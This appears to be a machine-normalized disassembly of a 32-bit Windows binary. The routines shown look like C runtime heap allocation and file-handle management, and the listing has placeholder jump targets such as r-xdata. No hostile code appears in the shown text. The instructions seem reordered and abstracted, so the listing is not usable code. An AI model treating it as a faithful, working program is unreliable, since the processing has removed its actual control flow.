mov [ esi + eax + 0x4 ] cl
jne r-xdata
inc cl
cmp [ ebp + 0xb ] 0x0
mov [ esi + eax + 0x4 ] cl
jne r-xdata
mov ecx [ ebp - 0x4 ]
lea edi [ eax + ecx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov esi 0x80000000
shr esi cl
or [ edi ] esi
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
or [ ebx + 0x4 ] edi
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp - 0x4 ]
or [ eax + ecx * 4 + 0x44 ] edi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
or [ ebx ] edi
sub_40af14
mov eax [ rw-data ]
mov ecx [ rw-data ]
push esi
push edi
xor edi edi
cmp eax ecx
jne r-xdata
mov ecx [ rw-data ]
push 0x41c4
push 0x8
lea eax [ eax + eax * 4 ]
push [ rw-data ]
lea esi [ ecx + eax * 4 ]
call [ HeapAlloc@IAT ]
cmp eax edi
mov [ esi + 0x10 ] eax
je r-xdata
lea eax [ ecx + ecx * 4 + 0x50 ]
shl eax 0x2
push eax
push [ rw-data ]
push edi
push [ rw-data ]
call [ HeapReAlloc@IAT ]
cmp eax edi
je r-xdata
xor eax eax
jmp r-xdata
push 0x4
push 0x2000
push 0x100000
push edi
call [ VirtualAlloc@IAT ]
cmp eax edi
mov [ esi + 0xc ] eax
jne r-xdata
add [ rw-data ] 0x10
mov [ rw-data ] eax
mov eax [ rw-data ]
pop edi
pop esi
retn
or [ esi + 0x8 ] 0xffffffff
mov [ esi ] edi
mov [ esi + 0x4 ] edi
inc [ rw-data ]
mov eax [ esi + 0x10 ]
or [ eax ] 0xffffffff
mov eax esi
push [ esi + 0x10 ]
push edi
push [ rw-data ]
call [ HeapFree@IAT ]
sub_40afc5
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
push ebx
push esi
push edi
mov esi [ ecx + 0x10 ]
mov eax [ ecx + 0x8 ]
xor ebx ebx
mov eax ebx
push 0x3f
imul eax eax 0x204
pop edx
lea eax [ eax + esi + 0x144 ]
mov [ ebp - 0x4 ] eax
shl eax 0x1
inc ebx
jmp r-xdata
mov [ eax + 0x8 ] eax
mov [ eax + 0x4 ] eax
add eax 0x8
dec edx
jne r-xdata
mov edi ebx
push 0x4
shl edi 0xf
add edi [ ecx + 0xc ]
push 0x1000
push 0x8000
push edi
call [ VirtualAlloc@IAT ]
test eax eax
jne r-xdata
test eax eax
jl r-xdata
lea edx [ edi + 0x7000 ]
cmp edi edx
ja r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x4 ]
lea ecx [ edi + 0xc ]
add eax 0x1f8
push 0x1
pop edi
mov [ eax + 0x4 ] ecx
mov [ ecx + 0x8 ] eax
lea ecx [ edx + 0xc ]
mov [ eax + 0x8 ] ecx
mov [ ecx + 0x4 ] eax
and [ esi + ebx * 4 + 0x44 ] 0x0
mov [ esi + ebx * 4 + 0xc4 ] edi
mov al [ esi + 0x43 ]
mov cl al
inc cl
test al al
mov eax [ ebp + 0x8 ]
mov [ esi + 0x43 ] cl
jne r-xdata
lea eax [ edi + 0x10 ]
pop edi
pop esi
pop ebx
leave
retn
mov edx 0x80000000
mov ecx ebx
shr edx cl
not edx
and [ eax + 0x8 ] edx
mov eax ebx
or [ eax + 0x4 ] edi
or [ eax - 0x8 ] 0xffffffff
or [ eax + 0xfec ] 0xffffffff
lea ecx [ eax + 0xffc ]
mov [ eax - 0x4 ] 0xff0
mov [ eax ] ecx
lea ecx [ eax - 0x1004 ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0xfe8 ] 0xff0
add eax 0x1000
lea ecx [ eax - 0x10 ]
cmp ecx edx
jbe r-xdata
sub_40b0c0
push ebp
mov ebp esp
sub esp 0xc
mov ecx [ ebp + 0x8 ]
mov eax [ ebp + 0x10 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov edx edi
lea esi [ eax + 0x17 ]
sub edx [ ecx + 0xc ]
mov eax [ ecx + 0x10 ]
and esi 0xfffffff0
shr edx 0xf
mov ecx edx
imul ecx ecx 0x204
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ecx
mov ecx [ edi - 0x4 ]
dec ecx
cmp esi ecx
mov [ ebp + 0x10 ] ecx
mov ebx [ ecx + edi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
mov [ ebp - 0x4 ] ebx
jle r-xdata
jge r-xdata
test bl 0x1
jne r-xdata
push 0x1
pop eax
mov ebx [ ebp + 0xc ]
sub [ ebp + 0x10 ] esi
lea ecx [ esi + 0x1 ]
mov [ ebx - 0x4 ] ecx
lea ebx [ ebx + esi - 0x4 ]
mov esi [ ebp + 0x10 ]
mov [ ebp + 0xc ] ebx
sar esi 0x4
dec esi
mov [ ebx - 0x4 ] ecx
cmp esi 0x3f
jbe r-xdata
xor eax eax
jmp r-xdata
add ebx ecx
cmp esi ebx
jg r-xdata
test [ ebp - 0x4 ] 0x1
jne r-xdata
push 0x3f
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
dec ecx
cmp ecx 0x3f
mov [ ebp - 0x8 ] ecx
jbe r-xdata
mov ecx [ ebp - 0xc ]
mov edi [ ecx + esi * 8 + 0x4 ]
lea ecx [ ecx + esi * 8 ]
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] ecx
mov [ ecx + 0x4 ] ebx
mov ecx [ ebx + 0x4 ]
mov [ ecx + 0x8 ] ebx
mov ecx [ ebx + 0x4 ]
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov esi [ ebp - 0x4 ]
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
mov ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop ecx
mov [ ebp - 0x8 ] ecx
mov eax [ ebp + 0x10 ]
mov [ ebx ] eax
mov [ eax + ebx - 0x4 ] eax
mov cl [ esi + eax + 0x4 ]
cmp esi 0x20
mov [ ebp + 0xf ] cl
inc cl
mov [ esi + eax + 0x4 ] cl
jae r-xdata
mov ecx [ edi + 0x4 ]
cmp ecx [ edi + 0x8 ]
jne r-xdata
push 0x3f
pop esi
mov ecx [ edi + 0x8 ]
mov ebx [ edi + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ecx [ edi + 0x4 ]
mov edi [ edi + 0x8 ]
mov [ ecx + 0x8 ] edi
mov ecx [ ebp + 0x10 ]
sub ecx esi
add [ ebp - 0x4 ] ecx
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
cmp ecx 0x20
jae r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
cmp [ ebp + 0xf ] 0x0
jne r-xdata
mov ecx [ edi + 0x8 ]
mov esi [ edi + 0x4 ]
mov [ ecx + 0x4 ] esi
mov ecx [ edi + 0x4 ]
mov esi [ edi + 0x8 ]
mov [ ecx + 0x8 ] esi
mov esi [ ebp + 0x10 ]
add esi [ ebp - 0x4 ]
mov [ ebp + 0x10 ] esi
sar esi 0x4
dec esi
cmp esi 0x3f
jbe r-xdata
cmp esi 0x20
jae r-xdata
mov edx [ ebp + 0xc ]
mov edi [ ebp - 0x4 ]
mov ecx [ ebp + 0xc ]
sar edi 0x4
dec edi
lea ecx [ ecx + esi - 0x4 ]
cmp edi 0x3f
jbe r-xdata
add ecx 0xffffffe0
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp - 0x8 ]
lea ecx [ ecx + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ ecx ]
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ esi - 0x20 ]
mov edx 0x80000000
lea ecx [ esi - 0x20 ]
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] edi
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx esi
jmp r-xdata
mov edi 0x80000000
mov ecx esi
shr edi cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] edi
push 0x3f
pop esi
lea ecx [ esi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
lea ecx [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0xc4 ] ebx
dec [ ecx ]
jne r-xdata
mov ebx 0x80000000
mov ecx esi
shr ebx cl
lea esi [ esi + eax + 0x4 ]
not ebx
and [ eax + edx * 4 + 0x44 ] ebx
dec [ esi ]
jne r-xdata
mov ebx [ ebp - 0xc ]
lea ebx [ ebx + edi * 8 ]
mov [ ebp + 0x10 ] ebx
mov ebx [ ebx + 0x4 ]
mov [ ecx + 0x4 ] ebx
mov ebx [ ebp + 0x10 ]
mov [ ecx + 0x8 ] ebx
mov [ ebx + 0x4 ] ecx
mov ebx [ ecx + 0x4 ]
mov [ ebx + 0x8 ] ecx
mov ebx [ ecx + 0x4 ]
cmp ebx [ ecx + 0x8 ]
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
shr edx cl
or [ eax ] edx
mov ebx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and [ ecx + 0x4 ] ebx
mov ecx [ ebp + 0x8 ]
and [ ecx ] ebx
jmp r-xdata
mov edx [ ebp + 0xc ]
mov ecx [ ebp - 0x4 ]
lea eax [ edx + esi - 0x4 ]
mov [ eax ] ecx
mov [ ecx + eax - 0x4 ] ecx
jmp r-xdata
mov cl [ edi + eax + 0x4 ]
cmp edi 0x20
mov [ ebp + 0x13 ] cl
inc cl
mov [ edi + eax + 0x4 ] cl
jae r-xdata
lea eax [ esi + 0x1 ]
mov [ edx - 0x4 ] eax
mov [ edx + esi - 0x8 ] eax
jmp r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
cmp [ ebp + 0x13 ] 0x0
jne r-xdata
lea eax [ eax + edx * 4 + 0xc4 ]
lea ecx [ edi - 0x20 ]
mov edx 0x80000000
lea ecx [ edi - 0x20 ]
mov ebx 0x80000000
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx + 0x4 ] ebx
lea eax [ eax + edx * 4 + 0x44 ]
mov edx 0x80000000
mov ecx edi
jmp r-xdata
mov ebx 0x80000000
mov ecx edi
shr ebx cl
mov ecx [ ebp + 0x8 ]
or [ ecx ] ebx
shr edx cl
or [ eax ] edx
sub_40b3b6
cmp [ rw-data ] 0xffffffff
push ebx
push ebp
push esi
push edi
jne r-xdata
push 0x2020
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov esi eax
test esi esi
je r-xdata
mov esi rw-data
jmp r-xdata
xor eax eax
mov ebp [ VirtualAlloc@IAT ]
push 0x4
push 0x2000
push __dos_header
push 0x0
call ebp
mov edi eax
test edi edi
je r-xdata
cmp esi rw-data
je r-xdata
push 0x4
mov ebx 0x10000
push 0x1000
push ebx
push edi
call ebp
test eax eax
je r-xdata
push esi
push 0x0
push [ rw-data ]
call [ HeapFree@IAT ]
push 0x8000
push 0x0
push edi
call [ VirtualFree@IAT ]
mov eax rw-data
cmp esi eax
jne r-xdata
mov [ esi ] eax
mov eax [ rw-data ]
mov [ esi + 0x4 ] eax
mov [ rw-data ] esi
mov eax [ esi + 0x4 ]
mov [ eax ] esi
cmp [ rw-data ] 0x0
jne r-xdata
xor edx edx
cmp ebp 0x10
setge dl
dec edx
and edx ecx
dec edx
inc ebp
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
add eax 0x8
cmp ebp 0x400
jl r-xdata
push ebx
push 0x0
push edi
call sub_405360
add esp 0xc
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] eax
mov eax esi
jmp r-xdata
or [ edi + 0xf8 ] 0xff
lea eax [ edi + 0x8 ]
mov [ edi ] eax
mov [ edi + 0x4 ] 0xf0
add edi 0x1000
jmp r-xdata
lea eax [ edi + __dos_header ]
lea ecx [ esi + 0x98 ]
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x18 ]
mov [ esi + 0xc ] ecx
mov [ esi + 0x10 ] edi
mov [ esi + 0x8 ] eax
xor ebp ebp
mov ecx 0xf1
mov [ rw-data ] eax
jmp r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn
mov eax [ esi + 0x10 ]
add eax ebx
cmp edi eax
jae r-xdata
sub_40b4fa
push esi
mov esi [ esp + 0x8 ]
push 0x8000
push 0x0
push [ esi + 0x10 ]
call [ VirtualFree@IAT ]
cmp [ rw-data ] esi
jne r-xdata
cmp esi rw-data
je r-xdata
mov eax [ esi + 0x4 ]
mov [ rw-data ] eax
or [ rw-data ] 0xffffffff
pop esi
retn
mov eax [ esi + 0x4 ]
mov ecx [ esi ]
push esi
push 0x0
mov [ eax ] ecx
mov eax [ esi ]
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
push [ rw-data ]
call [ HeapFree@IAT ]
pop esi
retn
sub_40b550
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
cmp esi [ rw-data ]
je r-xdata
and [ ebp - 0x4 ] 0x0
lea edi [ esi + 0x2010 ]
mov ebx 0x3ff000
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0x8 ] 0x0
jg r-xdata
sub ebx 0x1000
sub edi 0x8
test ebx ebx
jge r-xdata
mov eax ebx
push 0x4000
add eax [ esi + 0x10 ]
push 0x1000
push eax
call [ VirtualFree@IAT ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0xffffffff
je r-xdata
cmp [ edi ] 0xf0
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
mov ecx esi
mov esi [ esi + 0x4 ]
je r-xdata
or [ edi ] 0xffffffff
dec [ rw-data ]
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
cmp [ ecx + 0x18 ] 0xffffffff
jne r-xdata
mov [ esi + 0xc ] edi
cmp eax edi
jbe r-xdata
push 0x1
lea eax [ ecx + 0x20 ]
pop edx
inc [ ebp - 0x4 ]
dec [ ebp + 0x8 ]
je r-xdata
cmp edx 0x400
jne r-xdata
inc edx
add eax 0x8
cmp edx 0x400
jl r-xdata
push ecx
call sub_40b4fa
pop ecx
cmp [ eax ] 0xffffffff
jne r-xdata
sub_40b612
mov eax [ esp + 0x4 ]
mov edx rw-data
push esi
mov ecx edx
mov ecx [ ecx ]
cmp ecx edx
je r-xdata
cmp eax [ ecx + 0x14 ]
jb r-xdata
xor eax eax
pop esi
retn
jmp r-xdata
test al 0xf
jne r-xdata
cmp eax [ ecx + 0x10 ]
jbe r-xdata
mov esi eax
mov edx 0x100
and esi 0xfff
cmp esi edx
jb r-xdata
mov esi [ esp + 0xc ]
mov [ esi ] ecx
mov esi [ esp + 0x10 ]
mov ecx eax
and cx 0xf000
sub eax ecx
mov [ esi ] ecx
sub eax edx
pop esi
sar eax 0x4
lea eax [ eax + ecx + 0x8 ]
retn
sub_40b669
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
sub ecx [ eax + 0x10 ]
sar ecx 0xc
lea eax [ eax + ecx * 8 + 0x18 ]
mov ecx [ esp + 0xc ]
movzx edx [ ecx ]
add [ eax ] edx
and [ ecx ] 0x0
cmp [ eax ] 0xf0
mov [ eax + 0x4 ] 0xf1
jne r-xdata
retn
inc [ rw-data ]
cmp [ rw-data ] 0x20
jne r-xdata
push 0x10
call sub_40b550
pop ecx
sub_40b6ae
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ rw-data ]
push edi
mov ebx [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
lea ecx [ esi + 0x2018 ]
mov eax edi
sub eax esi
sub eax 0x18
sar eax 0x3
shl eax 0xc
add eax edx
cmp edi ecx
mov [ ebp - 0x4 ] eax
jae r-xdata
mov eax rw-data
mov edi eax
jmp r-xdata
mov ebx [ ebp + 0x8 ]
mov ecx [ edi ]
mov ebx [ ebp + 0x8 ]
cmp ecx ebx
jl r-xdata
mov edi [ edi ]
cmp edi eax
je r-xdata
cmp [ edi + 0xc ] 0x0
jne r-xdata
mov edx [ esi + 0x10 ]
cmp edx 0xffffffff
je r-xdata
mov esi [ esi ]
cmp esi [ rw-data ]
je r-xdata
mov eax [ edi ]
cmp eax ebx
jl r-xdata
add edi 0x8
lea ecx [ esi + 0x2018 ]
add eax 0x1000
cmp edi ecx
mov [ ebp - 0x4 ] eax
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
call sub_40b3b6
test eax eax
je r-xdata
jmp r-xdata
mov ebx [ edi + 0xc ]
and [ ebp - 0x4 ] 0x0
mov esi ebx
mov eax ebx
sub esi edi
sub esi 0x18
sar esi 0x3
shl esi 0xc
add esi [ edi + 0x10 ]
cmp [ ebx ] 0xffffffff
jne r-xdata
add [ ebp - 0x4 ] 0x1000
add edi 0x8
cmp edi [ ebp - 0x8 ]
jb r-xdata
cmp [ edi + 0x4 ] ebx
jbe r-xdata
jmp r-xdata
push ebx
push ecx
push eax
call sub_40b8b6
add esp 0xc
test eax eax
jne r-xdata
xor eax eax
mov ecx [ eax + 0x10 ]
mov [ ecx + 0x8 ] bl
lea edx [ ecx + ebx + 0x8 ]
mov [ rw-data ] eax
mov [ ecx ] edx
mov edx 0xf0
sub edx ebx
mov [ ecx + 0x4 ] edx
movzx edx bl
sub [ eax + 0x18 ] edx
lea eax [ ecx + 0x100 ]
jmp r-xdata
cmp [ edi + 0x10 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x4 ]
push 0x4
shl eax 0xc
push 0x1000
push eax
push esi
mov [ ebp - 0x8 ] eax
call [ VirtualAlloc@IAT ]
cmp eax esi
jne r-xdata
cmp [ ebp - 0x4 ] 0x10
jge r-xdata
jmp r-xdata
push ebx
push eax
push [ ebp - 0x4 ]
call sub_40b8b6
add esp 0xc
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ esi + 0x10 ]
lea edi [ esi + 0x18 ]
mov [ ebp - 0x8 ] eax
cmp edi eax
mov [ ebp - 0x4 ] ecx
jae r-xdata
mov [ rw-data ] esi
sub [ edi ] ebx
mov [ esi + 0x8 ] edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ edi + 0x4 ] ebx
pop edi
pop esi
pop ebx
leave
retn
push 0x0
push [ ebp - 0x8 ]
push esi
call sub_405360
mov edx [ ebp - 0x4 ]
add esp 0xc
test edx edx
mov ecx ebx
jle r-xdata
add eax 0x8
inc [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
je r-xdata
mov [ edi + 0x4 ] ebx
mov [ rw-data ] edi
lea eax [ edi + 0x2018 ]
lea eax [ esi + 0x4 ]
mov [ ebp - 0x4 ] edx
sbb eax eax
and eax ecx
mov [ edi + 0xc ] eax
mov eax [ ebp + 0x8 ]
mov [ esi + 0x8 ] al
mov [ edi + 0x8 ] ebx
sub [ ebx ] eax
sub [ esi + 0x4 ] eax
lea ecx [ esi + eax + 0x8 ]
lea eax [ esi + 0x100 ]
mov [ esi ] ecx
jmp r-xdata
cmp [ ecx ] 0xffffffff
je r-xdata
or [ eax + 0xf4 ] 0xff
lea edx [ eax + 0x4 ]
mov [ eax - 0x4 ] edx
mov edx 0xf0
mov [ eax ] edx
mov [ ecx ] edx
mov [ ecx + 0x4 ] 0xf1
add eax 0x1000
add ecx 0x8
dec [ ebp - 0x4 ]
jne r-xdata
cmp ecx eax
add ecx 0x8
jmp r-xdata
cmp ecx eax
jae r-xdata
sub_40b8b6
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push ebx
push esi
mov esi [ ecx + 0x4 ]
push edi
mov edi [ ecx ]
lea ebx [ ecx + 0xf8 ]
cmp esi edx
mov [ ebp - 0x4 ] edi
mov eax edi
mov [ ebp + 0x8 ] ebx
jb r-xdata
add esi edi
cmp [ esi ] 0x0
je r-xdata
lea eax [ edi + edx ]
mov [ edi ] dl
cmp eax ebx
jae r-xdata
lea esi [ eax + edx ]
cmp esi ebx
jae r-xdata
mov eax esi
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
add [ ecx ] edx
sub [ ecx + 0x4 ] edx
jmp r-xdata
lea esi [ ecx + 0x8 ]
mov bl [ eax ]
test bl bl
jne r-xdata
imul ecx ecx 0xf
shl eax 0x4
sub eax ecx
jmp r-xdata
lea eax [ edi + 0x8 ]
jmp r-xdata
xor eax eax
lea eax [ esi + edx ]
cmp eax [ ebp + 0x8 ]
jae r-xdata
movzx esi bl
add eax esi
push 0x1
lea ebx [ eax + 0x1 ]
pop esi
pop edi
pop esi
pop ebx
leave
retn
mov al [ esi ]
test al al
jne r-xdata
cmp esi edx
jae r-xdata
inc ebx
inc esi
jmp r-xdata
movzx eax al
add esi eax
jmp r-xdata
push 0x1
lea ebx [ esi + 0x1 ]
pop eax
lea ebx [ eax + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x4 ]
jne r-xdata
cmp [ ebx ] 0x0
jne r-xdata
cmp esi edi
jae r-xdata
cmp eax edx
jae r-xdata
inc ebx
inc eax
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea esi [ ecx + 0x8 ]
mov [ ecx ] esi
sub esi edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] esi
jmp r-xdata
sub [ ebp + 0xc ] esi
cmp [ ebp + 0xc ] edx
jb r-xdata
mov [ ecx + 0x4 ] esi
jmp r-xdata
lea ebx [ esi + edx ]
cmp ebx [ ebp + 0x8 ]
jae r-xdata
sub [ ebp + 0xc ] eax
cmp [ ebp + 0xc ] edx
jb r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov [ eax ] dl
add eax 0x8
jmp r-xdata
mov edi [ ebp - 0x4 ]
mov eax ebx
jmp r-xdata
and [ ecx + 0x4 ] 0x0
lea eax [ ecx + 0x8 ]
mov [ ecx ] eax
sub eax edx
mov [ ecx ] ebx
mov [ ecx + 0x4 ] eax
jmp r-xdata
mov esi ebx
jmp r-xdata
lea esi [ eax + edx ]
cmp esi [ ebp + 0x8 ]
jb r-xdata
mov [ esi ] dl
lea eax [ esi + 0x8 ]
sub_40b9da
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
movzx ecx [ edx ]
push edi
mov edi [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
mov eax ebx
sub eax [ edi + 0x10 ]
sar eax 0xc
cmp ecx [ ebp + 0x14 ]
lea edi [ edi + eax * 8 + 0x18 ]
jbe r-xdata
jae r-xdata
mov eax [ ebp + 0x14 ]
sub ecx eax
mov [ edx ] al
add [ edi ] ecx
mov [ edi + 0x4 ] 0xf1
jmp r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ebp + 0x14 ]
lea esi [ edx + eax ]
lea eax [ ebx + 0xf8 ]
cmp esi eax
ja r-xdata
mov [ ebp - 0x4 ] 0x1
lea eax [ ecx + edx ]
jne r-xdata
cmp [ eax ] 0x0
jne r-xdata
mov al [ ebp + 0x14 ]
mov [ edx ] al
mov eax [ ebx ]
cmp edx eax
ja r-xdata
cmp eax esi
inc eax
jmp r-xdata
sub ecx [ ebp + 0x14 ]
add [ edi ] ecx
cmp esi eax
jbe r-xdata
cmp eax esi
jae r-xdata
lea eax [ ebx + 0xf8 ]
cmp esi eax
jae r-xdata
and [ ebx + 0x4 ] 0x0
lea eax [ ebx + 0x8 ]
mov [ ebx ] eax
xor eax eax
mov [ ebx ] esi
cmp [ esi ] al
jne r-xdata
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc eax
cmp [ esi + eax ] 0x0
je r-xdata
sub_40ba90
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
nop
inc edx
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
inc ecx
mov al [ esi ]
or al al
je r-xdata
sub_40bad0
push ebp
mov ebp esp
push edi
push esi
push ebx
mov ecx [ ebp + 0x10 ]
jecxz r-xdata
mov eax ecx
pop ebx
pop esi
pop edi
leave
retn
mov ebx ecx
mov edi [ ebp + 0x8 ]
mov esi edi
xor eax eax
[ edi ]
neg ecx
add ecx ebx
mov edi esi
mov esi [ ebp + 0xc ]
[ esi ] [ edi ]
mov al [ esi - 0x1 ]
xor ecx ecx
cmp al [ edi - 0x1 ]
ja r-xdata
not ecx
je r-xdata
dec ecx
dec ecx
sub_40bb10
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
inc edx
bts [ esp ] eax
jmp r-xdata
add esp 0x20
pop esi
leave
retn
inc esi
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
mov al [ esi ]
or al al
je r-xdata
lea eax [ esi - 0x1 ]
sub_40bb4a
mov eax [ rw-data ]
test eax eax
je r-xdata
xor eax eax
retn
push [ esp + 0x4 ]
call eax
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
retn
sub_40bb65
push ecx
push ecx
push ebx
push ebp
push esi
push edi
push 0x12
or edi 0xffffffff
call sub_406d15
xor ebx ebx
pop ecx
mov [ esp + 0x10 ] ebx
mov [ esp + 0x14 ] ebx
mov ebp rw-data
mov esi 0x480
push esi
call sub_40734d
test eax eax
pop ecx
je r-xdata
lea eax [ esi + 0x480 ]
push 0x12
call sub_406d76
pop ecx
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
pop ecx
retn
add [ rw-data ] 0x20
lea ecx [ ebx * 4 + rw-data ]
lea edx [ eax + 0x480 ]
mov [ ecx ] eax
add [ esp + 0x14 ] 0x20
add ebp 0x4
inc ebx
cmp ebp rw-data
mov [ esp + 0x10 ] ebx
jl r-xdata
test [ esi + 0x4 ] 0x1
jne r-xdata
shl ebx 0x5
mov edi ebx
push edi
call sub_40bdc5
pop ecx
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
and [ eax + 0x8 ] 0x0
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x24
add edx esi
jmp r-xdata
mov esi [ ebp ]
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp ]
add esi 0x24
add eax 0x480
jmp r-xdata
cmp [ esi + 0x8 ] 0x0
jne r-xdata
cmp eax edx
jae r-xdata
cmp esi eax
jae r-xdata
lea ebx [ esi + 0xc ]
push ebx
call [ EnterCriticalSection@IAT ]
test [ esi + 0x4 ] 0x1
je r-xdata
push 0x11
call sub_406d15
cmp [ esi + 0x8 ] 0x0
pop ecx
jne r-xdata
or [ esi ] 0xffffffff
mov eax esi
sub eax [ ebp ]
push 0x24
pop ecx
cdq
idiv ecx
mov edi eax
add edi [ esp + 0x14 ]
cmp edi 0xffffffff
jne r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
mov ebx [ esp + 0x10 ]
push 0x11
call sub_406d76
pop ecx
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSection@IAT ]
inc [ esi + 0x8 ]
mov ebx [ esp + 0x10 ]
sub_40bc88
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
cmp [ eax + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub ecx 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec ecx
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40bd04
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
call sub_406dfe
mov [ eax ] 0x9
call sub_406e07
and [ eax ] 0x0
or eax 0xffffffff
mov eax ecx
sar eax 0x5
lea edi [ eax * 4 + rw-data ]
mov eax ecx
and eax 0x1f
lea esi [ eax + eax * 8 ]
mov eax [ edi ]
shl esi 0x2
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40bd83
mov eax [ esp + 0x4 ]
